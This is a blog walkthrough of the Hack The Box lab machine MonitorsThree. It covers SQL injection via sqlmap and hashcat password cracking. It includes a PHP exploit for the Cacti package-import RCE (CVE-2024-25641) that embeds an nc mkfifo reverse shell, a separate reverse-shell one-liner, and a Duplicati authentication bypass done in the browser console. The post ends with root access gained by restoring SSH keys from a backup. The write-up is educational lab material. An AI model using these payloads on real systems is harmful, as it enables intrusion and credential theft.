<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><style>:root{--accent-color:#FF4D4D;--font-size:17.5px}</style><title>HTB: MonitorsThree</title>
<meta name=description content="Platform: Hack The Box Link: MonitorsThree Level: Medium OS: Linux MonitorsThree begins with a website on port 80 and a Cacti instance hosted on a subdomain. …"><meta name=keywords content="HackTheBox"><meta property="og:url" content="https://scorpiosec.com/posts/htb-monitorsthree/"><meta property="og:type" content="website"><meta property="og:title" content="HTB: MonitorsThree"><meta property="og:description" content="Platform: Hack The Box Link: MonitorsThree Level: Medium OS: Linux MonitorsThree begins with a website on port 80 and a Cacti instance hosted on a subdomain. …"><meta property="og:image" content="https://scorpiosec.com/images/HTB-MonitorsThree/MonitorsThree.png"><meta property="og:image:secure_url" content="https://scorpiosec.com/images/HTB-MonitorsThree/MonitorsThree.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:title content="HTB: MonitorsThree"><meta name=twitter:description content="Platform: Hack The Box Link: MonitorsThree Level: Medium OS: Linux MonitorsThree begins with a website on port 80 and a Cacti instance hosted on a subdomain. …"><meta property="twitter:domain" content="https://scorpiosec.com/posts/htb-monitorsthree/"><meta property="twitter:url" content="https://scorpiosec.com/posts/htb-monitorsthree/"><meta name=twitter:image content="https://scorpiosec.com/images/HTB-MonitorsThree/MonitorsThree.png"><link rel=canonical href=https://scorpiosec.com/posts/htb-monitorsthree/><link rel=stylesheet type=text/css href=/css/normalize.min.css media=print><link rel=stylesheet type=text/css href=/css/main.min.css><link id=dark-theme rel=stylesheet href=/css/dark.min.css><script src=/js/bundle.min.dbdc9b4541e086f12258f5155a48310ed9f06d931aacfe9b7c85f8699b1f5cb2.js integrity="sha256-29ybRUHghvEiWPUVWkgxDtnwbZMarP6bfIX4aZsfXLI="></script></head><body><script>setThemeByUserPref()</script><header class=header><nav class=header-nav><div class=avatar><a href=https://scorpiosec.com/><img src=/redscorpio.jpg alt=avatar></a></div><div class=nav-title><a class=nav-brand href=https://scorpiosec.com/>Scorpiosec</a></div><div class=nav-links><div class=nav-link><a href=https://scorpiosec.com/posts/ aria-label><span data-feather=book></span> Posts</a></div><div class=nav-link><a href=https://scorpiosec.com/projects/ aria-label><span data-feather=code></span> Projects</a></div><div class=nav-link><a href=https://scorpiosec.com/tags/ aria-label><span data-feather=tag></span> Tags</a></div><div class=nav-link><a href=https://scorpiosec.com/categories/ aria-label><span data-feather=folder></span> Categories</a></div><div class="nav-link language-switcher"><a href=/fr/posts/htb-monitorsthree/>Français</a></div><span class=nav-icons-divider></span><div class="nav-link dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a aria-hidden=true role=switch><span class=theme-toggle-icon data-feather=moon></span></a></div><div class=nav-link id=hamburger-menu-toggle><span class="sr-only hamburger-menu-toggle-screen-reader-target">menu</span>
<a aria-checked=false aria-labelledby=hamburger-menu-toggle id=hamburger-menu-toggle-target role=switch><span data-feather=menu></span></a></div><ul class="nav-hamburger-list visibility-hidden"><li class=nav-item><a href=https://scorpiosec.com/posts/><span data-feather=book></span> Posts</a></li><li class=nav-item><a href=https://scorpiosec.com/projects/><span data-feather=code></span> Projects</a></li><li class=nav-item><a href=https://scorpiosec.com/tags/><span data-feather=tag></span> Tags</a></li><li class=nav-item><a href=https://scorpiosec.com/categories/><span data-feather=folder></span> Categories</a></li><li class="nav-item dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a role=switch><span class=theme-toggle-icon data-feather=moon></span></a></li></ul></div></nav></header><main id=content><div class="post container"><div class=post-header-section><h1>HTB: MonitorsThree</h1><small role=doc-subtitle></small><p class=post-date>7 min read |
<span class=post-date>January 17, 2025</span></p><ul class=post-tags><li class=post-tag><a href=https://scorpiosec.com/tags/hackthebox>HackTheBox</a></li></ul></div><div class=post-content><ul><li>Platform: Hack The Box</li><li>Link: <a href=https://app.hackthebox.com/machines/MonitorsThree>MonitorsThree</a></li><li>Level: Medium</li><li>OS: Linux</li></ul><hr><p>MonitorsThree begins with a website on port 80 and a Cacti instance hosted on a subdomain. The <code>Forgot Password?</code> feature on the main site is vulnerable to SQL injection, which we exploit to retrieve the admin user&rsquo;s password. Using these credentials, we access the Cacti dashboard and leverage <code>CVE-2024-25641</code> to gain an initial foothold on the system. Further exploration reveals additional password hashes, enabling us to pivot to another user via SSH. Through system enumeration, we discover an internally accessible Duplicati instance. With some tunneling we are able to access it and an authentication bypass exploit allows us to log into Duplicati and recover the root flag.</p><p>Target IP address - <code>10.10.11.30</code></p><h2 id=scanning>Scanning</h2><pre tabindex=0><code>nmap -sC -sV -oA nmap/MonitorsThree 10.10.11.30
</code></pre><p><strong>Results</strong></p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>Starting Nmap 7.94SVN <span style=color:#56b6c2>(</span> https://nmap.org <span style=color:#56b6c2>)</span> at 2025-01-14 18:00 CST
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#c678dd>for</span> 10.10.11.30
</span></span><span style=display:flex><span>Host is up <span style=color:#56b6c2>(</span>0.060s latency<span style=color:#56b6c2>)</span>.
</span></span><span style=display:flex><span>Not shown: <span style=color:#d19a66>997</span> closed tcp ports <span style=color:#56b6c2>(</span>conn-refused<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>PORT     STATE    SERVICE VERSION
</span></span><span style=display:flex><span>22/tcp   open     ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 <span style=color:#56b6c2>(</span>Ubuntu Linux; protocol 2.0<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>| ssh-hostkey: 
</span></span><span style=display:flex><span>|   <span style=color:#d19a66>256</span> 86:f8:7d:6f:42:91:bb:89:72:91:af:72:f3:01:ff:5b <span style=color:#56b6c2>(</span>ECDSA<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|_  <span style=color:#d19a66>256</span> 50:f9:ed:8e:73:64:9e:aa:f6:08:95:14:f0:a6:0d:57 <span style=color:#56b6c2>(</span>ED25519<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>80/tcp   open     http    nginx 1.18.0 <span style=color:#56b6c2>(</span>Ubuntu<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|_http-server-header: nginx/1.18.0 <span style=color:#56b6c2>(</span>Ubuntu<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|_http-title: Did not follow redirect to http://monitorsthree.htb/
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>8084/tcp filtered websnp
</span></span><span style=display:flex><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span>Nmap <span style=color:#c678dd>done</span>: <span style=color:#d19a66>1</span> IP address <span style=color:#56b6c2>(</span><span style=color:#d19a66>1</span> host up<span style=color:#56b6c2>)</span> scanned in 13.83 seconds
</span></span></code></pre></div><p>Our nmap scan finds two open ports:</p><ul><li>22 running SSH</li><li>80 running HTTP, there is a redirection to <code>monitorsthree.htb</code>.</li></ul><h2 id=enumeration>Enumeration</h2><p>Going to <code>http://monitorsthree.htb/</code> we find a website providing network solutions services.</p><p><img src=/images/HTB-MonitorsThree/monitorsthree_website.png alt="MonitorsThree website"></p><p>There is a login page at <code>http://monitorsthree.htb/login.php</code>.</p><p><img src=/images/HTB-MonitorsThree/login_page_monitorsthree.png alt="MonitorsThree login"></p><p>Through directory brute forcing we discover <code>/admin</code> but currently we are unable to access it.</p><pre tabindex=0><code>gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://monitorsthree.htb/
</code></pre><p><img src=/images/HTB-MonitorsThree/gobuster_cmd.png alt="directory brute forcing"></p><p><img src=/images/HTB-MonitorsThree/monitorsthree_admin.png alt="admin page monitorsthree"></p><p>We also find a subdomain (<code>cacti</code>) through subdomain enumeration.</p><pre tabindex=0><code>ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --fc 404 -t 100 -u http://monitorsthree.htb -H &#34;Host: FUZZ.monitorsthree.htb&#34; -ic -fs 13560
</code></pre><p><img src=/images/HTB-MonitorsThree/monitorsthree_subdomain.png alt="cacti subdomain"></p><p>At <code>http://cacti.monitorsthree.htb/cacti/</code> we find another login page. We can see a version for the software, <code>1.2.26</code>.</p><p><img src=/images/HTB-MonitorsThree/cacti_login_page.png alt="cacti login page"></p><p>We get to <code>http://monitorsthree.htb/forgot_password.php</code> after selecting <code>Forgot password?</code> at <code>http://monitorsthree.htb/login.php</code>.</p><p><img src=/images/HTB-MonitorsThree/forgot_pwd.png alt="forgot password page"></p><p>We can try to exploit this feature via SQL injection. We capture the request and use it with SQLmap.</p><p><img src=/images/HTB-MonitorsThree/reset_pwd_request.png alt="reset password request"></p><p>We start by targeting the <code>username</code> parameter and SQLmap is able to identify the injection.</p><pre tabindex=0><code>sqlmap -r reset.txt --level 5 --risk 3 -p username --batch --threads=10
</code></pre><p><img src=/images/HTB-MonitorsThree/sqlmap1.png alt="SQL injection on username parameter"></p><p>We enumerate the target and find two databases.</p><pre tabindex=0><code>sqlmap -r reset.txt --level 5 --risk 3 -p username --batch --threads=10 --batch --dbs
</code></pre><p><img src=/images/HTB-MonitorsThree/dbs_found.png alt="databases found"></p><p>We can now enumerate the tables of <code>monitorsthree_db</code> database since <code>information_schema</code> is a default system database in MySQL.</p><pre tabindex=0><code>sqlmap -r reset.txt --level 5 --risk 3 -p username --batch --threads=10 --batch -D monitorsthree_db --tables
</code></pre><p><img src=/images/HTB-MonitorsThree/db_tables.png alt="tables found"></p><p>The <code>users</code> table is the most promising one, let&rsquo;s dump its content.</p><pre tabindex=0><code>sqlmap -r reset.txt --level 5 --risk 3 -p username --batch --threads=10 -D monitorsthree_db -T users --dbms=mysql --technique=T --dump
</code></pre><p><img src=/images/HTB-MonitorsThree/SQLmap_hashes.png alt="SQLmap hashes found"></p><p>We recover the password of <code>admin</code> with hashcat.</p><pre tabindex=0><code>hashcat -m 0 -a 0 admin_hash.txt /usr/share/wordlists/rockyou.txt
</code></pre><p><img src=/images/HTB-MonitorsThree/admin_pwd.png alt="admin password"></p><p>With the credentials <code>admin:greencacti2001</code> we are able to login on the cacti login page and access the dashboard.</p><blockquote><p>The same credentials also work on the login page at <code>http://monitorsthree.htb/login.php</code>.</p></blockquote><p><img src=/images/HTB-MonitorsThree/cacti_dashboard.png alt="cacti dashboard"></p><h2 id=initial-foothold>Initial Foothold</h2><h3 id=manual-exploit>Manual Exploit</h3><p>Researching vulnerability for the <code>Cacti version 1.2.26</code> leads to <code>CVE-2024-25641</code> allowing RCE by using a malicious package. The PoC is available <a href=https://github.com/cacti/cacti/security/advisories/GHSA-7cmj-g5qc-pj88>here</a>.</p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-PHP data-lang=PHP><span style=display:flex><span><span style=color:#56b6c2>&lt;?</span><span style=color:#e06c75>php</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e06c75>$xmldata</span> <span style=color:#56b6c2>=</span> <span style=color:#98c379>&#34;&lt;xml&gt;
</span></span></span><span style=display:flex><span><span style=color:#98c379>   &lt;files&gt;
</span></span></span><span style=display:flex><span><span style=color:#98c379>       &lt;file&gt;
</span></span></span><span style=display:flex><span><span style=color:#98c379>           &lt;name&gt;resource/test.php&lt;/name&gt;
</span></span></span><span style=display:flex><span><span style=color:#98c379>           &lt;data&gt;%s&lt;/data&gt;
</span></span></span><span style=display:flex><span><span style=color:#98c379>           &lt;filesignature&gt;%s&lt;/filesignature&gt;
</span></span></span><span style=display:flex><span><span style=color:#98c379>       &lt;/file&gt;
</span></span></span><span style=display:flex><span><span style=color:#98c379>   &lt;/files&gt;
</span></span></span><span style=display:flex><span><span style=color:#98c379>   &lt;publickey&gt;%s&lt;/publickey&gt;
</span></span></span><span style=display:flex><span><span style=color:#98c379>   &lt;signature&gt;&lt;/signature&gt;
</span></span></span><span style=display:flex><span><span style=color:#98c379>&lt;/xml&gt;&#34;</span>;
</span></span><span style=display:flex><span><span style=color:#e06c75>$filedata</span> <span style=color:#56b6c2>=</span> <span style=color:#98c379>&#34;&lt;?php shell_exec(&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2&gt;&amp;1|nc {IP} {PORT} &gt;/tmp/f&#39;); ?&gt;&#34;</span>;
</span></span><span style=display:flex><span><span style=color:#e06c75>$keypair</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>openssl_pkey_new</span>(); 
</span></span><span style=display:flex><span><span style=color:#e06c75>$public_key</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>openssl_pkey_get_details</span>(<span style=color:#e06c75>$keypair</span>)[<span style=color:#98c379>&#34;key&#34;</span>]; 
</span></span><span style=display:flex><span><span style=color:#e06c75>openssl_sign</span>(<span style=color:#e06c75>$filedata</span>, <span style=color:#e06c75>$filesignature</span>, <span style=color:#e06c75>$keypair</span>, <span style=color:#e06c75>OPENSSL_ALGO_SHA256</span>);
</span></span><span style=display:flex><span><span style=color:#e06c75>$data</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>sprintf</span>(<span style=color:#e06c75>$xmldata</span>, <span style=color:#e06c75>base64_encode</span>(<span style=color:#e06c75>$filedata</span>), <span style=color:#e06c75>base64_encode</span>(<span style=color:#e06c75>$filesignature</span>), <span style=color:#e06c75>base64_encode</span>(<span style=color:#e06c75>$public_key</span>));
</span></span><span style=display:flex><span><span style=color:#e06c75>openssl_sign</span>(<span style=color:#e06c75>$data</span>, <span style=color:#e06c75>$signature</span>, <span style=color:#e06c75>$keypair</span>, <span style=color:#e06c75>OPENSSL_ALGO_SHA256</span>);
</span></span><span style=display:flex><span><span style=color:#e06c75>file_put_contents</span>(<span style=color:#98c379>&#34;test.xml&#34;</span>, <span style=color:#e06c75>str_replace</span>(<span style=color:#98c379>&#34;&lt;signature&gt;&lt;/signature&gt;&#34;</span>, <span style=color:#98c379>&#34;&lt;signature&gt;&#34;</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>base64_encode</span>(<span style=color:#e06c75>$signature</span>)<span style=color:#56b6c2>.</span><span style=color:#98c379>&#34;&lt;/signature&gt;&#34;</span>, <span style=color:#e06c75>$data</span>));
</span></span><span style=display:flex><span><span style=color:#e06c75>system</span>(<span style=color:#98c379>&#34;cat test.xml | gzip -9 &gt; test.xml.gz; rm test.xml&#34;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#7f848e>?&gt;</span>
</span></span></code></pre></div><p>After running the script we get <code>test.xml.gz</code>. In Cacti, we go to <code>Import/Export</code> > <code>Import Packages</code>.</p><p>Then upload the malicious package and import it.</p><p><img src=/images/HTB-MonitorsThree/cacti_pkg_import.png alt="cacti package import"></p><p>We execute our payload by going to <code>http://cacti.monitorsthree.htb/cacti/resource/test.php</code> and receive a connection on our listener.</p><p><img src=/images/HTB-MonitorsThree/foothold_manual.png alt="manual exploit foothold"></p><h3 id=automated-exploit>Automated Exploit</h3><p>In Metasploit we can use the <code>multi/http/cacti_package_import_rce</code> to obtain a shell as <code>www-data</code>.</p><pre tabindex=0><code>set password greencacti2001
set rhosts cacti.monitorsthree.htb
set lhost tun0
set lport PORT_NUMBER
</code></pre><p><img src=/images/HTB-MonitorsThree/foothold_cacti.png alt="Metasploit exploit foothold"></p><p>The shell is not interactive so we will get a new one.</p><p><img src=/images/HTB-MonitorsThree/bad_shell.png alt="bad shell"></p><p>Using a reverse shell command (<code>nc mkfifo</code>) from <a href=https://www.revshells.com/>revshells</a>, we gain a shell which we upgrade.</p><pre tabindex=0><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc YOUR_IP PORT_NUMBER &gt;/tmp/f
</code></pre><p><img src=/images/HTB-MonitorsThree/better_shell.png alt="better shell"></p><p>We know that we are dealing with the Cacti software, so we look for some config file. <code>config.php</code> is located at <code>/var/www/html/cacti/include/config.php</code>.</p><p><img src=/images/HTB-MonitorsThree/cacti_config_file_location.png alt="Cacti configuration file location"></p><p>The file contains some database credentials.</p><p><img src=/images/HTB-MonitorsThree/db_creds.png alt="database credentials"></p><p>We log into the database.</p><pre tabindex=0><code>mysql -u cactiuser -p cactiuser
</code></pre><p>After listing the tables we find some passwords hashes in the <code>user_auth</code> table. These are Blowfish hashes.</p><pre tabindex=0><code>show tables;

select * from user_auth;
</code></pre><p><img src=/images/HTB-MonitorsThree/pwd_hashes.png alt="password hashes"></p><p>Using hashcat we recover the password of the user marcus, <code>12345678910</code>.</p><pre tabindex=0><code>hashcat -m 3200 -a 0 marcus_hash.txt /usr/share/wordlists/rockyou.txt
</code></pre><p><img src=/images/HTB-MonitorsThree/marcus_pwd.png alt="marcus password"></p><h2 id=shell-as-marcus>Shell as marcus</h2><p>We switch to the user <code>marcus</code> and find the user flag in his personal directory.</p><p><img src=/images/HTB-MonitorsThree/user_flag.png alt="user flag"></p><p>We find the SSH keys for <code>marcus</code> in <code>.ssh</code>, we send the <code>id_rsa</code> file to our local machine in order to login via SSH.</p><p><img src=/images/HTB-MonitorsThree/ssh_key_marcus.png alt="marcus ssh key"></p><pre tabindex=0><code>ssh -i id_rsa marcus@monitorsthree.htb
</code></pre><p><img src=/images/HTB-MonitorsThree/marcus_ssh_login.png alt="marcus ssh login"></p><p>After running linpeas we find some internal connections. We know what services most of these ports are running, we only need to check <code>8200</code> and <code>37181</code>.</p><p><img src=/images/HTB-MonitorsThree/active_ports.png alt="active ports"></p><p>We need to do some tunneling in order to access these ports, I used <a href=https://github.com/nicocha30/ligolo-ng/releases>ligolo-ng</a> to do it.</p><p>Only the port <code>8200</code> is accessible, where we find a <a href=https://duplicati.com/>Duplicati</a> login page.</p><blockquote><p>Duplicati is a free, open-source backup software designed to securely store encrypted backups of data.</p></blockquote><p><img src=/images/HTB-MonitorsThree/duplicati_login.png alt="Duplicati login page"></p><p>Researching <code>duplicati vulnerability</code> we find a medium article <a href=https://medium.com/@STarXT/duplicati-bypassing-login-authentication-with-server-passphrase-024d6991e9ee>here</a> demonstrating an authentication bypass and a Github issue page also details the steps to reproduce the exploit <a href=https://github.com/duplicati/duplicati/issues/5197>here</a>.</p><p><img src=/images/HTB-MonitorsThree/exploit_steps.png alt="Exploit steps"></p><p>Going back to our linpeas output, we see that there is a Duplicati directory in <code>/opt</code>.</p><p><img src=/images/HTB-MonitorsThree/duplicati_opt_directory.png alt="Duplicati opt directory"></p><p>We find <code>Duplicati-server.sqlite</code> in <code>/opt/duplicati/config</code>.</p><p><img src=/images/HTB-MonitorsThree/duplicati_db_file.png alt="Duplicati database file"></p><p>With <code>scp</code> we download the database file, it contains the server passphrase.</p><pre tabindex=0><code>scp -i id_rsa marcus@monitorsthree.htb:/opt/duplicati/config/Duplicati-server.sqlite /home/kscorpio/Machines/HTB/MonitorsThree
</code></pre><p><img src=/images/HTB-MonitorsThree/server-passphrase.png alt="Duplicati server passphrase"></p><p>Next we convert the server passphrase in HEX.</p><pre tabindex=0><code>echo &#34;Wb6e855L3sN9LTaCuwPXuautswTIQbekmMAr7BrK2Ho=&#34; | base64 -d | xxd -p
</code></pre><p><img src=/images/HTB-MonitorsThree/HEX_conversion.png alt="server passphrase HEX conversion"></p><pre tabindex=0><code>59be9ef39e4bdec37d2d3682bb03d7b9abadb304c841b7a498c02bec1acad87a
</code></pre><p>With Burp we intercept a login request and make note of the session nonce. This value will be different for each login request. Make sure you URL-decode the session-nonce value.</p><p><img src=/images/HTB-MonitorsThree/duplicati_login_request.png alt="Duplicati login request"></p><p>Open the console in the browser on the Duplicati login page and use the command below.</p><pre tabindex=0><code>var noncepwd = CryptoJS.SHA256(CryptoJS.enc.Hex.parse(CryptoJS.enc.Base64.parse(&#39;url_decoded_nonce_value&#39;) + &#39;salted_hex_passphrase&#39;)).toString(CryptoJS.enc.Base64);
</code></pre><p>Then run <code>noncepwd</code> to get the new password value.</p><pre tabindex=0><code>noncepwd
</code></pre><p><img src=/images/HTB-MonitorsThree/duplicati_auth_bypass.png alt="Duplicati auth bypass"></p><p>In Burp we replace the value of <code>password</code> with the value of <code>noncepwd</code> and URL-encode it.</p><p><img src=/images/HTB-MonitorsThree/new_password.png alt="New password"></p><p>After forwarding the request, we are now logged in Duplicati.</p><p><img src=/images/HTB-MonitorsThree/duplicati_dashboard.png alt="Duplicati dashboard"></p><h2 id=privilege-escalation>Privilege Escalation</h2><h3 id=root-flag-recovery>Root flag recovery</h3><p>Go to <code>Add Backup</code> > <code>Configure a new backup</code>. For the <code>General backup settings</code> just pick a name and generate a passphrase. You can also change the <code>Encryption</code> to <code>No encryption</code> if you want.</p><p><img src=/images/HTB-MonitorsThree/backup1.png alt="Backup command 1"></p><p>For the backup destination we enter <code>/source/tmp</code>.</p><p><img src=/images/HTB-MonitorsThree/backup2.png alt="Backup command 2"></p><p>Add the path <code>/source/root/root.txt</code> for in the <code>Source Data</code> section.</p><p><img src=/images/HTB-MonitorsThree/backup3.png alt="Backup command 3"></p><p>In the <code>Schedule</code> section uncheck automatic backups and finally save your backup. In the <code>Home</code> section run your backup with the <code>Run now</code> button.</p><p><img src=/images/HTB-MonitorsThree/run_now_backup.png alt="Run backup now button"></p><p>Go to <code>Restore</code>, choose your backup and select the files to restore.</p><p><img src=/images/HTB-MonitorsThree/files_to_restore.png alt="restore root flag"></p><p>Decide where to restore the files, we have to pick a directory which <code>marcus</code> can access.</p><p><img src=/images/HTB-MonitorsThree/restore_location.png alt="restore root flag location"></p><p>After the completion of the backup, the root flag is now accessible.</p><p><img src=/images/HTB-MonitorsThree/root_flag.png alt="root flag"></p><h3 id=access-to-the-root-account>Access to the root account</h3><p>Although we read the root flag, we still do not have access to the root account.</p><p>Using the same backup process we discover that the only file in <code>/root/.ssh</code> is <code>authorized_keys</code> and the file is empty.</p><p><img src=/images/HTB-MonitorsThree/root_ssh_directory.png alt="root SSH directory"></p><blockquote><p>We do not have the write permission to the root <code>authorized_keys</code> file otherwise we would have just added marcus&rsquo; public key to it.</p></blockquote><p><img src=/images/HTB-MonitorsThree/root_authorized_keys.png alt="root authorized_keys file"></p><p>We can make a backup of <code>/home/marcus/.ssh/authorized_keys</code> and restore it to <code>/root/.ssh/</code> in order to be able to login as root via SSH.</p><p>For the new backup, select <code>/source/home/marcus/.ssh/</code> as <code>Source Data</code>.</p><p><img src=/images/HTB-MonitorsThree/source_data_root.png alt="Source data for SSH backup"></p><p>Restore the <code>authorized_keys</code> file.</p><p><img src=/images/HTB-MonitorsThree/restore_file_root.png alt="authorized_keys file restore"></p><p>Enter <code>/source/root/.ssh/</code> as the location.</p><p><img src=/images/HTB-MonitorsThree/restore_file_root.png alt="authorized_keys file restore location"></p><p>We are now able to login as root via SSH, and as shown in the image below <code>authorized_keys</code> is no longer empty.</p><p><img src=/images/HTB-MonitorsThree/root_account.png alt="SSH root login"></p></div><div class=prev-next><div class=prev-post><p><a href=/posts/thm-silverplatter/>&#8592;
Previous:
THM: Silver Platter</a></p><p class=prev-post-date>January 13, 2025</p></div><div class=next-post><p><a href=/posts/thm-smol/>Next:
THM: Smol
&#8594;</a></p><p class=next-post-date>January 27, 2025</p></div></div><svg id="btt-button" class="arrow-logo" xmlns="http://www.w3.org/2000/svg" height="1em" viewBox="0 0 384 512" onclick="scrollToTop()" title="Go to top"><path d="M177 159.7l136 136c9.4 9.4 9.4 24.6.0 33.9l-22.6 22.6c-9.4 9.4-24.6 9.4-33.9.0L160 255.9l-96.4 96.4c-9.4 9.4-24.6 9.4-33.9.0L7 329.7c-9.4-9.4-9.4-24.6.0-33.9l136-136c9.4-9.5 24.6-9.5 34-.1z"/></svg>
<script>let backToTopButton=document.getElementById("btt-button");window.onscroll=function(){scrollFunction()};function scrollFunction(){document.body.scrollTop>20||document.documentElement.scrollTop>20?backToTopButton.style.display="block":backToTopButton.style.display="none"}function scrollToTop(){window.scrollTo(0,0)}</script></div><aside class=post-toc><nav id=toc><nav id=TableOfContents><ul><li><ul><li><a href=#scanning>Scanning</a></li><li><a href=#enumeration>Enumeration</a></li><li><a href=#initial-foothold>Initial Foothold</a><ul><li><a href=#manual-exploit>Manual Exploit</a></li><li><a href=#automated-exploit>Automated Exploit</a></li></ul></li><li><a href=#shell-as-marcus>Shell as marcus</a></li><li><a href=#privilege-escalation>Privilege Escalation</a><ul><li><a href=#root-flag-recovery>Root flag recovery</a></li><li><a href=#access-to-the-root-account>Access to the root account</a></li></ul></li></ul></li></ul></nav></nav></aside></main><footer class=footer><span>&copy; 2025 K-Scorpio</span>
<span>Made with &#10084;&#65039; using <a target=_blank href=https://github.com/gokarna-theme/gokarna-hugo>Gokarna</a></span></footer></body></html>